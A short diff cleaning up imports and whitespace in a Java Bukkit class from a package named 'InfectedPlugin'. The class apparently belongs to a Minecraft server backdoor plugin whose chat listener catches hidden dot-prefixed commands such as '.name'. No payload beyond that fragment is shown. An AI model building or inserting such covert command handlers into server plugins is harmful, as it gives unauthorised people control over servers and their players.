@@ -2,7 +2,8 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_name extends IP_Command implements Listener
@@ -12,8 +13,7 @@ public class Command_name extends IP_Command implements Listener
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
-        boolean cancel = false;
-        
+
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
@@ -21,7 +21,7 @@ public class Command_name extends IP_Command implements Listener
             {
                 return;
             }
-            
+
             if (args[0].equalsIgnoreCase(".name"))
             {
                 if (args.length == 1)
@@ -29,7 +29,7 @@ public class Command_name extends IP_Command implements Listener
                     p.sendMessage(ChatColor.RED + "Usage: .name <player> <name>");
                     event.setCancelled(true);
                 }
-                
+
                 Player target;
                 String name = null;
                 if (args.length >= 2)
